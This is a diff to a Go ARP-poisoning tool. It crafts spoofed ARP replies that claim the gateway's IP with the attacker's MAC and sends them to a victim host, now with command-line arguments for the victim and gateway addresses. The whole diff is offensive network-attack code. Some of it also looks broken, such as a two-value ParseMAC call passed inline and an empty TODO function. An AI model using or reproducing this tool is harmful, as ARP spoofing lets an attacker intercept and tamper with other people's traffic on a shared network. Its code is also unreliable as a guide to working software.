@@ -4,6 +4,7 @@ import (
 	"log"
 	"net"
 
+	"arp_poision/commandLineHandle"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
@@ -19,42 +20,44 @@ var (
 	option gopacket.SerializableLayer
 )
 
-func craft_arp(attackerMac []byte, targeMac []byte, getwayIp []byte, targetIp []byte, op uint16) *layers.ARP {
+func craft_arp(attackerMac net.HardwareAddr, targeMac net.HardwareAddr, getwayIp net.IP, targetIp net.IP, op uint16) *layers.ARP {
 	arp := &layers.ARP{
 		AddrType:          layers.LinkTypeEthernet,
 		Protocol:          layers.EthernetTypeIPv4,
 		HwAddressSize:     6,
 		ProtAddressSize:   4,
 		Operation:         op,
-		SourceHwAddress:   net.HardwareAddr(attackerMac), // Attacker mac
-		SourceProtAddress: getwayIp[:4],
-		DstHwAddress:      net.HardwareAddr(targeMac), // target
-		DstProtAddress:    targetIp[:4],
+		SourceHwAddress:   attackerMac, // Attacker mac
+		SourceProtAddress: getwayIp,
+		DstHwAddress:      targeMac, // target
+		DstProtAddress:    targetIp,
 	}
 	return arp
 }
 
-func craft_ethernet(targetHard []byte, attackerHard []byte) *layers.Ethernet {
+func craft_ethernet(targetHard net.HardwareAddr, attackerHard net.HardwareAddr) *layers.Ethernet {
 	ether := &layers.Ethernet{
 		EthernetType: layers.EthernetTypeARP,
-		SrcMAC:       net.HardwareAddr(attackerHard),
-		DstMAC:       net.HardwareAddr(targetHard),
+		SrcMAC:       attackerHard,
+		DstMAC:       targetHard,
 	}
 	return ether;
 }
 
-// TODO
+// TODO:
 func getTargetMac(targetIp []byte){
 
 }
 
-func Packet(handler *pcap.Handle) {
+func Packet(handler *pcap.Handle, args commandlinehandle.CommandLineArgs) {
+
 
     mac := net.HardwareAddr{0xFF, 0xAA, 0xFA, 0xAA, 0xFF, 0xAA};
 	ip := []byte{192, 168, 0, 2}
     buffer := gopacket.NewSerializeBuffer();
     eth := craft_ethernet(mac,mac);
-    arp := craft_arp(mac, mac, ip, ip, layers.ARPReply);
+	// FIXME: Make a function that convert these type and parse them and check them
+    arp := craft_arp(net.ParseMAC(args.AttackerMAC), net.ParseMAC(args.VictimMAC), net.ParseIP(args.DefaultGateway).To4(), net.ParseIP(args.VictimIP).To4(), layers.ARPReply);
 	opt := gopacket.SerializeOptions{
 		FixLengths: true,
 		ComputeChecksums: true,
@@ -69,5 +72,6 @@ func Packet(handler *pcap.Handle) {
 	}
     
 	log.Printf("Everything goes as expected packet has been sent \n" );
-	log.Println(ip[:4] );
+	log.Println(string(ip) );
+
 }
